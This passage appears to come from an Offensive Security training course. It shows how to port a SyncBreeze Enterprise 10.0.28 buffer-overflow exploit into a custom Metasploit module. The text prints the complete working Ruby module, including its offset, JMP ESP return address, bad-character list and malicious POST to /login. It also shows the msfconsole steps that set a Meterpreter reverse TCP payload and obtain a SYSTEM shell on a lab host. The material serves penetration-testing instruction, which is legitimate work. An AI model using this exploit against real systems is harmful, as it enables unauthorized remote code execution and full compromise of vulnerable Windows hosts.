Even the most unskilled programmer can build a custom MSF module. The Ruby language and exploit structure are clear, straightforward, and very similar to Python. To show how this works, we will port our SyncBreeze Python exploit to the Metasploit format, using an existing exploit in the framework as a template and copying it to the established folder structure under the home directory of the root user.

```
┌──(kali㉿kali)-[~]
└─$ sudo mkdir -p /root/.msf4/modules/exploits/windows/http
[sudo] password for kali: 
                                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ sudo cp /usr/share/metasploit-framework/modules/exploits/windows/http/disk_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
                                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ sudo nano /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
```

> Listing 60 - Creating a template for the exploit

To begin, we will update the header information, including the name of the module, its description, author, and external references.

```
'Name'           => 'SyncBreeze Enterprise Buffer Overflow',
'Description'    => %q(
  This module ports our python exploit of SyncBreeze Enterprise 10.0.28 to MSF.
),
'License'        => MSF_LICENSE,
'Author'         => [ 'Offensive Security', 'offsec' ],
'References'     =>
  [
    [ 'EDB', '42886' ]
  ],
```

> Listing 61 - Metasploit module header information

In the next section, we will select the default options. In this case, we will set _EXITFUNC_ to "thread" and specify the bad characters we found, which are \x00\x0a\x0d\x25\x26\x2b\x3d. Finally, in the _Targets_ section, we will specify the version of SyncBreeze along with the address of the JMP ESP instruction and the offset used to overwrite EIP.

```
'DefaultOptions' =>
  {
    'EXITFUNC' => 'thread'
  },
'Platform'       => 'win',
'Payload'        =>
  {
    'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d",
    'Space'      => 500
  },
'Targets'        =>
  [
    [ 'SyncBreeze Enterprise 10.0.28',
      {
        'Ret' => 0x10090c83, # JMP ESP -- libspp.dll
        'Offset' => 780
      }]
  ],
```

> Listing 62 - Metasploit module options and settings

Next, we will update the _check_ function, which is done by performing a HTTP GET request to the URL /. On a vulnerable system, the result contains the text "Sync Breeze Enterprise v10.0.28".

```
def check
  res = send_request_cgi(
    'uri'    =>  '/',
    'method' =>  'GET'
  )

  if res && res.code == 200
	  product_name = res.body.scan(/(Sync Breeze Enterprise v[^<]*)/i).flatten.first
	  if product_name =~ /10\.0\.28/
      		return Exploit::CheckCode::Appears
    end
  end

  return Exploit::CheckCode::Safe
end
```

> Listing 63 - The check function for our module

The final section is the exploit itself. First, we will create the exploit string, which uses the offset and the memory address for the JMP ESP instruction along with a NOP sled and the payload. Then we'll send the crafted malicious string through an HTTP POST request using the /login URL as in the original exploit. We will populate the HTTP POST _username_ variable with the exploit string:

```
def exploit
  print_status("Generating exploit...")
  exp = rand_text_alpha(target['Offset'])
  exp << [target.ret].pack('V')
  exp << rand_text(4)
  exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode
  exp << payload.encoded

  print_status("Sending exploit...")

  send_request_cgi(
    'uri' =>  '/login',
    'method' =>  'POST',
    'connection' =>  'keep-alive',
    'vars_post' => {
            'username' => "#{exp}",
            'password' => "fakepsw"
          }
  )

  handler
  disconnect
end
```

> Listing 64 - Exploit function of the Metasploit module

Putting all the parts together gives us a complete Metasploit exploit module for the SyncBreeze Enterprise vulnerability:

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SyncBreeze Enterprise Buffer Overflow',
      'Description'    => %q(
        This module ports our python exploit of SyncBreeze Enterprise 10.0.28 to MSF.
      ),
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Offensive Security', 'offsec' ],
      'References'     =>
        [
          [ 'EDB', '42886' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d",
          'Space'      => 500
        },
      'Targets'        =>
        [
          [ 'SyncBreeze Enterprise 10.0.28',
            {
              'Ret' => 0x10090c83, # JMP ESP -- libspp.dll
              'Offset' => 780
            }]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Oct 20 2019',
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(80)])
  end

  def check
    res = send_request_cgi(
      'uri'    =>  '/',
      'method' =>  'GET'
    )

    if res && res.code == 200
	    product_name = res.body.scan(/(Sync Breeze Enterprise v[^<]*)/i).flatten.first
	    if product_name =~ /10\.0\.28/
      		return Exploit::CheckCode::Appears
    	end
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Generating exploit...")
    exp = rand_text_alpha(target['Offset'])
    exp << [target.ret].pack('V')
    exp << rand_text(4)
    exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode
    exp << payload.encoded

    print_status("Sending exploit...")

    send_request_cgi(
      'uri' =>  '/login',
      'method' =>  'POST',
      'connection' =>  'keep-alive',
      'vars_post' => {
              'username' => "#{exp}",
              'password' => "fakepsw"
            }
    )

    handler
    disconnect
  end
end
```

> Listing 65 - Metasploit exploit module

With the exploit complete, we can start Metasploit and search for it.

```
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole -q
[sudo] password for kali: 
[*] Starting persistent handler(s)...
msf6 > search syncbreeze

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/fileformat/syncbreeze_xml  2017-03-29       normal     No     Sync Breeze Enterprise 9.5.16 - Import Command Buffer Overflow
   1  exploit/windows/http/syncbreeze_bof        2017-03-15       great      Yes    Sync Breeze Enterprise GET Buffer Overflow
   2  exploit/windows/http/syncbreeze            2019-10-20       excellent  Yes    SyncBreeze Enterprise Buffer Overflow


Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/http/syncbreeze

msf6 > use exploit/windows/http/syncbreeze
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/syncbreeze) > 
```

> Listing 66 - Locating the custom exploit

We notice that the search for _syncbreeze_ now contains three results and that the second result is our custom exploit. Next we'll choose a payload, set up the required parameters, and perform a vulnerability check.

```
msf6> use exploit/windows/http/syncbreeze
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/syncbreeze) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/syncbreeze) > set RHOSTS 192.168.120.11
RHOSTS => 192.168.120.11
msf6 exploit(windows/http/syncbreeze) > set LHOST 192.168.118.2
LHOST => 192.168.118.2
msf6 exploit(windows/http/syncbreeze) > check
[*] 192.168.120.11:80 - The target appears to be vulnerable.

```

> Listing 67 - Setting up parameters and checking exploitability

Finally, we launch our exploit to gain a reverse shell.

```
msf6 exploit(windows/http/syncbreeze) > exploit

[*] Started reverse TCP handler on 192.168.118.2:4444 
[*] Generating exploit...
[*] Sending exploit...
[*] Sending stage (175174 bytes) to 192.168.120.11
[*] Meterpreter session 1 opened (192.168.118.2:4444 -> 192.168.120.11:49755) at 2021-01-28 10:30:20 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >  
```

> Listing 68 - Exploitation of SyncBreeze using custom MSF module

Excellent. It's working perfectly. We have a shell thanks to our new Metasploit exploit module.